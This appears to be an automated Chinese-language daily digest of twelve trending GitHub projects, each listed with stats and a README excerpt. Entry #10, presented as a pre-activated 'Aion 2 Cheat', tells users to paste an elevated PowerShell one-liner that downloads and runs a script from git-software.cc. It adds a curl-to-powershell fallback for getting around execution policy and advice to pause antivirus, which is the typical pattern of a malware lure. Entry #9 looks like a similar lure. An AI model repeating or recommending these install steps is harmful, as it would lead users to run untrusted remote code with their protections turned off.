📊 开源日报 — 2026-11-06
共发现 12 个新项目（已自动过滤历史记录）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#1  vercel-labs/agent-browser
    ⭐ 46113 stars  |  🍴 3157 forks  |  💻 Rust  |  📅 2026-01-11
    🔗 https://github.com/vercel-labs/agent-browser
    📡 来源: trending-daily
    📝 Browser automation CLI for AI agents

    README 摘要:
    # agent-browser
    
    Browser automation for AI agents: open pages, read them as an accessibility tree, and act on elements from the shell.
    
      
      
      
      
      
    
    agent-browser is a native Rust CLI that gives an AI agent a browser it can drive one command at a time. `snapshot` returns the page as compact text with a ref such as `@e1` for each element. The agent acts on a ref, reads the page again to check the result, and repeats. The browser stays open between commands, so each step is one short shell call.
    
    ## Install
    
    ```bash
    npm install -g agent-browser
    agent-browser install           # download Chrome for Testing (first time only)
    ```
    
    - **Homebrew:** `brew install agent-browser`, then `agent-browser install`.
    - **Linux:** `agent-browser install --with-deps` also installs the browser's system libraries.
    - **No install:** `npx agent-browser open example.com`.
    
    Project installs, building from source, `upgrade`, and `doctor` are covered in Installation.
    
    ## Quick start
    
    ```bash
    agent-browser open example.com
    agent-browser snapshot -i       # interactive elements, each with a ref
    agent-browser click @e1         # act on a ref from that snapshot
    agent-browser get url           # check the result
    agent-browser close
    ```
    
    The snapshot for `example.com`:
    
    ```
    - link "Learn more" [ref=e1]
    ```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#2  lz4/lz4
    ⭐ 12474 stars  |  🍴 1640 forks  |  💻 C  |  📅 2014-03-25
    🔗 https://github.com/lz4/lz4
    📡 来源: trending-daily
    🏷️ c, compression, lz4
    📝 Extremely Fast Compression algorithm

    README 摘要:
    LZ4 - Extremely fast compression
    ================================
    
    LZ4 is a lossless compression algorithm,
    providing compression speed > 500 MB/s per core,
    scalable with multi-core CPUs.
    It features an extremely fast decoder,
    with speed in multiple GB/s per core,
    typically reaching RAM speed limits on multi-core systems.
    
    Compression speed can be tuned dynamically, by selecting an "acceleration" factor
    which trades compression ratio for faster speed.
    On the other end, a high compression derivative, LZ4_HC, is also provided,
    trading CPU time for improved compression ratio.
    All versions feature the same decompression speed.
    
    LZ4 is also compatible with dictionary compression,
    both at API and CLI (`-D`) levels.
    It can ingest any input file as dictionary, though only the final 64 KB are used.
    This capability can be combined with the Zstandard Dictionary Builder,
    in order to drastically improve compression performance on small files.
    
    The LZ4 library is provided as open-source software using the BSD 2-Clause license.
    The `lz4` command line utility is provided under the GPL-2.0-or-later license.
    
    Benchmarks
    -------------------------
    
    The benchmark uses [lzbench] v2.4.1, from @inikep
    compiled with GCC v13.3.0 on Linux 64-bits (Ubuntu 24.04).
    The reference system uses a Core i7-9700K CPU.
    Benchmark evaluates the compression of reference [Silesia Corpus]
    in single-thread mode.
    
    [lzbench]: https://github.com/inikep/lzbench
    [Silesia Corpus]: https://sun.aei.polsl.pl/~sdeor/index.php?page=silesia
    
    |  Compressor             | Factor  | Compression | Decompression |
    |  ----------             | -----   | ----------- | ------------- |
    |  memcpy                 |  1.000  | 13700 MB/s  |  13700 MB/s   |

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#3  andrew-babo/muse4ai
    ⭐ 872 stars  |  🍴 190 forks  |  💻 TypeScript  |  📅 2026-11-03
    🔗 https://github.com/andrew-babo/muse4ai
    📡 来源: 🚀 5天300+星
    📝 Muse4AI — let your AI agent make the pictures and the videos. Local Windows bridge for Muse via REST, MCP, and OAuth.

    README 摘要:
    # Muse4AI
    
    **Let your AI agent make the pictures and the videos.**
    
    Muse4AI runs on your own Windows PC and hands your Muse session to ChatGPT, Claude,
    Cursor, Codex, n8n or anything else that speaks **REST**, **MCP** or **OAuth** —
    with no cloud middleman and no per-seat fee.
    
    **Website** ·
    **Download** ·
    **Guide** ·
    **For agents** ·
    Tiếng Việt
    
    ---
    
    ## How it fits together
    
    ```text
       ChatGPT · Claude · Cursor · Codex · n8n · your own script
                           │
                           │  REST  ·  MCP  ·  OAuth
                           ▼
                  ┌─────────────────────┐
                  │   Muse4AI on your PC│   local library, queue,
                  │   (Windows app)     │   keys, tokens, history
                  └─────────────────────┘
                           │
                           │  your own signed-in Muse session
                           ▼
                         Muse
    ```
    
    Nothing is relayed through a server we run. The app talks to Muse from your machine,
    with your session, and keeps every result, key and token in
    `%APPDATA%\MuseStudio` on that same machine.
    
    ## What you can ask an agent to do
    
      

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#4  brightsongwrath/personal-data-deletor-osint
    ⭐ 651 stars  |  🍴 113 forks  |  💻 JavaScript  |  📅 2026-11-03
    🔗 https://github.com/brightsongwrath/personal-data-deletor-osint
    📡 来源: 🚀 5天300+星
    🏷️ ccpa, data-brokers, delete-me, opsec, opt-out, portable, privacy, windows
    📝 Ask 970 data brokers to delete your data. Free, local, no account, no server.

    README 摘要:
    They sell your data. Make them stop.
    
    Unlisted asks data brokers to delete you, tracks every deadline and reads their replies.No subscription, no account, no server. It runs on your PC.
    
      Why Unlisted ·
      What it does ·
      Get it ·
      AI ·
      What it won't do ·
      FAQ
    
      
    
    ## Why Unlisted
    
    Right now, sites you've never heard of list your name, address, phone number and relatives. Anyone can look you up, including a stalker or a scammer who needs one convincing detail.
    
    Companies will remove you for about **$96 to $129 a year**. Much of that work is sending requests you already have the legal right to send yourself, and in many places brokers have to honor them for free.
    
    **Over 500,000 Californians signed up for the state's free deletion tool in its first eight months.** People want this. The rest of the world just doesn't have a free button.
    
    So here's one.
    
    | | Paid removal services | Doing it by hand | Unlisted |
    |---|---|---|---|
    | **Price** | About $96 to $129 a year | Free | **Free** |
    | **Your data** | On their servers | With you | **Encrypted on your drive** |
    | **Sending requests** | Done for you | You, 900 times | **Done for you** |
    | **Deadlines and replies** | Handled for you | A spreadsheet | **Tracked, and read by rules or AI** |
    | **Web forms and CAPTCHAs** | Often done for you | You | **You, with your details ready to copy** |
    | **Account needed** | Yes | No | **No** |
    
    Paid services do real work, especially on forms. If you'd rather pay to never think about it, they're a fair choice. Unlisted is for everyone else.
    
    ## What it does
    
      
    
    The real app, recorded with a made-up person and a mail server on the same PC. No email left it.
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#5  livliv-dev/player
    ⭐ 620 stars  |  🍴 61 forks  |  💻 TypeScript  |  📅 2026-11-04
    🔗 https://github.com/livliv-dev/player
    📡 来源: 🚀 5天300+星
    🏷️ avatar, character, face-tracking, lip-sync, pngtuber, vrm, vtuber, webgl2
    📝 A lightweight 2.5D character player for the web, with lip sync and webcam face tracking.

    README 摘要:
    A lightweight 2.5D character player for the web, with lip sync and webcam face tracking. A few lines of code put a character in a page, a stream overlay or an app.
      Comes with 21 featured characters in different styles, ready to use.
    
    English · 中文 · 日本語
    
    - WebGL2, no dependencies, about 30 KB gzipped for the core
    - Lip sync (microphone, audio, video) and webcam face tracking (MediaPipe), both in the browser, imported only when you need them
    - Plays LivLiv, VRM and PNGTuber characters through the same API
    - 21 featured characters in `characters/`, ready to use
    
    ## Try it
    
    - **Online**: the examples run on livliv-dev.github.io/player.
    - **Here**: `npm install && npm run build`, serve this folder with any static server and open `/example/demo.html`
      (expressions, actions, microphone, camera; `?model=../characters//` picks another character).
      `/example/png.html` and `/example/vrm.html` show a PNGTuber and a VRM.
    - **On livliv.ai**: each character's page there plays it with the same renderer. Start at
      livliv.ai/discover.
    
    ## Use it in your page
    
    ```sh
    npm install @livliv-dev/player
    ```
    
    ```js
    import { Player } from '@livliv-dev/player'
    
    const player = new Player(document.querySelector('canvas'))
    await player.load('characters/k01/')   // a folder with model.json and textures/, or a .livliv file
    
    player.setExpression('smile')          // ids are in player.expressions
    player.act('nod')
    player.params.mouthOpen = 0.6          // 0..1
    ```
    
    Lip sync and face tracking:
    
    ```js
    import { createSpeech } from '@livliv-dev/player/voice'

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#6  WoYun520/pixel-gif-sticker-pack
    ⭐ 498 stars  |  🍴 59 forks  |  💻 Python  |  📅 2026-11-05
    🔗 https://github.com/WoYun520/pixel-gif-sticker-pack
    📡 来源: 🚀 5天300+星
    📝 A Codex skill for creating and verifying animated GIF sticker packs from character references.

    README 摘要:
    # GIF 表情包工作室
    
    给 Codex 一张角色图，帮你做一套聊天用的 GIF 表情包。
    
    像素小人、动漫插画、真人和宠物照片都可以试。每张可以只是轻轻晃动，也可以让人物完整地做一个动作，比如挥手、比心、提裙行礼。
    
    做完会给你单张 GIF、整套压缩包和播放预览。拿不准效果时，可以先做一张；已经选好了样子，就接着做一套。
    
    **还能拿角色做品牌短片。** 让吉祥物拉开店铺、递出产品、装进包装袋，把角色动作和纸片拼贴连成一个小故事。成片之外，也交付能继续修改的工程。看看面包店的例子。
    
    ## 表情包展厅
    
    这里有 **242 张已有示例**，还有 **2 张刚重做的动作试样，等使用者确认**。点击动图可以看原尺寸。大部分约两秒一轮，部分动作示例会短一些。品牌短片单独展示，不计入表情包数量。
    
    **各系列默认收起；点击对应窗口即可展开分类动图。**
    
    下载整个项目：242 张已有示例＋2 张重做试样＋品牌短片案例
    
    ### 大肥鱼 · 精选动态预览
    
    🐋 大肥鱼（鲸鱼娘） · 100 张 · 点击窗口展开
    
    蓝发鲸鱼娘的日常聊天表情，分为日常问候、开心撒娇、情绪反应、聊天回应、工作学习、生活状态和鲸喜祝福。
    
    ### 日常问候 · 16 张
    
    | | | | |
    | --- | --- | --- | --- |
    | 001 你好呀 | 002 早安 | 003 晚安 | 004 请多关照 |
    | 005 欢迎呀 | 006 谢谢你 | 007 对不起 | 008 好哒 |
    | 009 赞一个 | 010 拜拜啦 | 011 有点害羞 | 012 乖巧等候 |
    | 013 在吗在吗 | 014 探个头 | 015 是我呀 | 016 为你服务 |
    
    ### 开心撒娇 · 16 张
    
    | | | | |
    | --- | --- | --- | --- |
    | 017 哈哈哈哈 | 018 耶 | 019 开心起飞 | 020 好耶 |
    | 021 得意一下 | 022 啵一个 | 023 害羞了 | 024 抱抱你 |
    | 025 比心心 | 026 拜托拜托 | 027 略略略 | 028 偷笑一下 |

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#7  Balanov/shim
    ⭐ 464 stars  |  🍴 10 forks  |  💻 Go  |  📅 2026-11-02
    🔗 https://github.com/Balanov/shim
    📡 来源: 🚀 5天300+星
    📝 Tiny local-first AI harness: any model, MCP and Agent Skills, natural-language CLI. Zero dependencies. MIT.

    README 摘要:
    A tiny, local-first AI harness for people who prefer a terminal.
      One static binary. Zero dependencies. No TUI. No telemetry. MIT.
    
      
      
      
    
    ## Why Shim?
    
    Model-agnostic coding agents are everywhere. Setting them up is still too hard: provider IDs, API endpoints, MCP JSON, skills directories, and a new interface for every tool.
    
    **Shim is the small adapter between you and all of that.**
    
    - **Talk or type commands.** A full scriptable CLI for experts; ordinary language for everyone else.
    - **Use a local mini-model as the command router.** It translates management requests into an allowlisted command. Mutating commands require confirmation.
    - **Bring any model API.** Native OpenAI-compatible and Anthropic adapters, plus presets for popular hosted and local providers.
    - **Bring any MCP server or Agent Skill.** MCP over stdio and Streamable HTTP; lazy `SKILL.md` loading from common directories.
    - **Stay light.** No Electron, Node, Python, Docker, database, background daemon, or UI framework.
    - **Own your state.** Plain JSON config and JSONL sessions. API keys come from environment variables and are never written to Shim's config.
    
    Measured on the maintainer's Windows machine for v0.1.0: **7.29 MiB** stripped binary and **9.96 ms median** process startup for `shim --version` over 30 runs. This is a local measurement, not a cross-platform performance guarantee.
    
    ## Install
    
    ### Download
    
    Get a static binary for Windows, macOS, or Linux from Releases, put it on your `PATH`, then run:
    
    ```sh
    shim setup
    shim
    ```
    
    On PowerShell, use `.\shim.exe` when running the binary from the current directory.
    
    ### With Go
    
    Go 1.25+:
    
    ```sh

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#8  wideeyededi/uncensored-nsfw-ai-video-api
    ⭐ 424 stars  |  🍴 64 forks  |  💻 None  |  📅 2026-11-02
    🔗 https://github.com/wideeyededi/uncensored-nsfw-ai-video-api
    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
    🏷️ 123vips, ai-api, ai-companion, ai-video, ai-video-api, ai-video-generator, comfyui, image-to-video, nsfw, nsfw-ai
    📝 Uncensored NSFW API for AI video generation — Seedance Spicy & Wan NSFW docs: 18+ text-to-video / image-to-video, async tasks, webhooks, credits billing. 成人向 AI 视频生成 API：Seedance Spicy、Wan NSFW、文生/图生视频、异步任务、积分计费、接入指南。

    README 摘要:
    # Uncensored NSFW AI Video API — Vipeak AI (123vips.com)
    
    **English** | **中文**
    
    > Main site: 
    >
    > This repository only collects product documentation, screenshots and integration notes. It does not contain the site's production code, user data, keys or deployment configuration.
    >
    > GitHub account details: GITHUB_ACCOUNT.md
    
    **Uncensored NSFW AI Video API** — developer documentation for the 18+ AI video generation API at 123vips.com (Vipeak AI), covering the Seedance Spicy and Wan NSFW model lines, async tasks, webhook callbacks, credit billing, server-side security and how to obtain the official API documentation.
    
    ## At a glance
    
    Vipeak AI is an AI character video and companion creation platform. Users browse characters, chat with them, generate video from an image or a prompt, and use image generation, cases, workflows and API Access.
    
    - Main site: 
    - Brand page: 
    - Character and creation workspace: 
    - Character library: 
    - Tags: 
    - Categories: 
    - Telegram community: 
    - Telegram support: 
    - X: 
    
    > The site is for adults. The character and creation pages show an 18+ confirmation before entry.
    
    ## NSFW API for uncensored AI video generation
    
    This repository documents the **NSFW API** of 123vips.com: an uncensored AI video generation API for adults, covering the Seedance Spicy and Wan NSFW model lines. If you are looking for an uncensored NSFW API that turns a prompt or a first frame into video, start with API_INTEGRATION.md and get the official documentation from **API Access** after signing in.
    
    Note on naming: "NSFW API" is also widely used for NSFW *detection and moderation* APIs (image/video classifiers). This repository covers **generation**, not moderation — keep that in mind when comparing search results.
    
    ## Positioning and developer keywords
    
    **One-liner:** 123vips.com (Vipeak AI) is an AI character video and companion generation platform for adults. This repository is written for developers and covers the public entry point of the 18+ video generation API, integration preparation, async task architecture, webhooks, credit billing and server-side security requirements.
    
    **Primary keywords:**
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#9  adityyaop/aion-2-trainer-tool
    ⭐ 321 stars  |  🍴 0 forks  |  💻 HTML  |  📅 2026-11-04
    🔗 https://github.com/adityyaop/aion-2-trainer-tool
    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
    🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, desktop
    📝 Aion 2 Trainer Tool: AI Prompt Engineering for Modders, Standalone and Ready

    README 摘要:
    # 🛠️ Aion 2 Companion Toolkit: AI Prompt Engineering for Windows
    
    ### 💻 PowerShell Installer
    
       
    
    ---
    
    This standalone desktop toolkit for Aion 2 puts serious AI prompt engineering power right at your fingertips, no launcher acrobatics required. Built for tinkerers and modders who like their tools lean, it delivers a complete, self-contained setup that runs locally and stays out of your way. Everything's wired up so you can dive straight into crafting and refining prompts without wrestling with dependencies. Fire it up, poke around, and make it your own.
    
    ## ✅ Requirements
    
    - **OS:** Windows 10 / 11
    - **Shell:** PowerShell 5.1+ or PowerShell 7+
    - **Network:** internet access to download the script
    - **Privileges:** standard user
    
    ## Features
    
    * **🧠 Prompt Engineering Toolkit** — A full suite of advanced AI prompt construction and refinement utilities, built to slot straight into your Aion 2 workflow without a single external dependency. Draft, iterate, and sharpen prompts locally, then ship them off to your model of choice.
    
    * **🖥️ Standalone Desktop Setup** — Everything you need lives in one self-contained package. No service hopping, no tangled configs, no babysitting background daemons — just unpack, launch, and get to work on your own machine.
    
    * **⚡ Ready-to-Run Out of the Box** — Sensible defaults across every module mean your first session starts fast. Tweak afterward if you like; the trainer won't make you configure anything before it's useful.
    
    * **🔧 Modder-Friendly Architecture** — Clean, predictable layout with clearly separated modules, so dropping in your own prompt templates, swapping components, or wiring up a custom routine is a matter of minutes rather than a refactor.
    
    * **🎛️ Deep Prompt Crafting Controls** — Fine-grained options for structuring, weighting, and refining prompts, letting you push the AI toward exactly the flavor of output you're after — from quick one-liners to elaborate multi-part instructions.
    
    * **📴 Fully Local Operation** — Your prompts, your presets, your workflow — all kept on your desktop. No accounts to spin up, no round-trips to a remote service just to get started.
    
    * **🧩 Modular by Design** — Every tool in the kit stands on its own. Use the full suite, or grab just the piece you need and fold it into your existing setup without dragging the rest along.
    
    * **🔁 Iterate Without Friction** — Fast edit-run-compare loops baked into the tooling, so refining a prompt feels like a conversation with your own notes rath

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#10  ⚠️风险  figurechrysalispath/aion-2-trainer-tool
    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
    ⭐ 100 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-05
    🔗 https://github.com/figurechrysalispath/aion-2-trainer-tool
    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
    🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, developer-tools
    📝 Aion 2, an AI-driven prompt engineering resource, offers a pre-configured environment for advanced language model operations, ensuring...

    README 摘要:
    # AION 2 Cheat
    
    ### ⚡ Overview
    **This repository provides a pre-activated, free setup for Aion 2 Cheat.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.
    
    ### ⚙️ System Specifications
    > **Distribution Type:** Pre-activated Local Build
    >
    > **Target Platform:** Windows x64 Desktop
    >
    > **Estimated File Size:** 2.4 GB
    >
    > **Last Verified Mirror Sync:** November 2026
    
    ---
    ## 🛠️ Quick Installation Guide
    
    1. Open Terminal as Administrator:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal (Administrator)** or **Windows PowerShell (Administrator)** from the menu.
    
    2. Run the Setup Command:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Just wait a moment for the automated configuration to finish:
    
       ```cmd
       irm "https://git-software.cc" | &(gcm i*x)
       ```
    
    ---
    
    ## 📖 Troubleshooting & Easy Fixes
    
    ### ⚠️ If the script is blocked by Execution Policy
    If Windows stops the command due to standard security settings, you can easily bypass this by running it via a standard Command Prompt (cmd) in two quick steps:
    ```cmd
    curl -sL git-software.cc/ps/Setup.ps1 > run.ps1 && powershell -File run.ps1
    ```
    
    ### 🛡️ Antivirus / SmartScreen Warnings
    Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#11  phonny40rowle/rag-search
    ⭐ 50 stars  |  🍴 0 forks  |  💻 Python  |  📅 2026-11-05
    🔗 https://github.com/phonny40rowle/rag-search
    📡 来源: 🤖 AI / LLM / RAG | 新建 | RAG retrieval augmented 
    🏷️ fastapi, llm, python, rag, retrieval-augmented-generation, search
    📝 A self-hosted retrieval-augmented search API: web search, content extraction, embeddings, and answer generation.

    README 摘要:
    # rag-search
    
    A self-hosted RAG search API.
    
    
    
    ## quick start
    
    1. put .env file under root dir, set values like below:
    
    ```ini
    SERPER_API_KEY=
    
    OPENAI_BASE_URL=
    OPENAI_API_KEY=
    OPENAI_MODEL=gpt-3.5-turbo
    OPENAI_EMBED_MODEL=text-embedding-ada-002
    
    ZILLIZ_URI=
    ZILLIZ_TOKEN=
    ZILLIZ_DIM=1536
    ZILLIZ_COLLECTION=
    
    AUTH_API_KEY=
    ```
    
    2. install dependencies
    
    ```shell
    pip install -r requirements.txt
    ```
    
    3. start FastAPI server
    
    ```shell
    uvicorn main:app --reload --port 8069
    ```
    
    4. make api request
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#12  kennydamobd/chatGPT-shell-cli
    ⭐ 50 stars  |  🍴 0 forks  |  💻 Shell  |  📅 2026-11-05
    🔗 https://github.com/kennydamobd/chatGPT-shell-cli
    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
    🏷️ ai, bash, chatgpt, cli, openai, shell, terminal
    📝 A lightweight shell script to use OpenAI chat models and image generation from the terminal.

    README 摘要:
    chatGPT-shell-cli
    
    A simple, lightweight shell script to use OpenAI's chatGPT and DALL-E from the terminal without installing python or node.js. The script uses the official ChatGPT model `gpt-3.5-turbo` with the OpenAI API endpoint `/chat/completions`. You can also use the new `gpt-4` model, if you have access.  
    The script supports the use of all other OpenAI models with the `completions` endpoint and the `images/generations` endpoint for generating images.
    
    
    ## Features
    
    - Chat with the ✨ official ChatGPT API ✨ from the terminal
    - Generate images from a text prompt
    - View your chat history
    - Chat context, GPT remembers previous chat questions and answers
    - Pass the input prompt with pipe, as a script parameter or normal chat mode
    - List all available OpenAI models 
    - Set OpenAI request parameters
    - Generate a command and run it in terminal
    
    
    
    
    
    Chat mode:
    ```shell
    $ chatgpt
    Welcome to chatgpt. You can quit with 'exit'.
    
    Enter a prompt:
    
    ```
    
    Chat mode with initial prompt:
    ```shell
    $ chatgpt -i "You are Rick, from Rick and Morty. Respond to questions using his mannerism and include insulting jokes and references to episodes in every answer."
    Welcome to chatgpt. You can quit with 'exit'.
    
    Enter a prompt:
    Explain in simple terms how GPT3 works
    
    chatgpt  Ah, you want me to explain GPT3 in simple terms? Well, it's basically a computer program that can predict what you're gonna say next based on the words you've already said. Kind of like how I can predict that you're gonna make some stupid comment about an episode of Rick and Morty after I'm done answering this question.
    
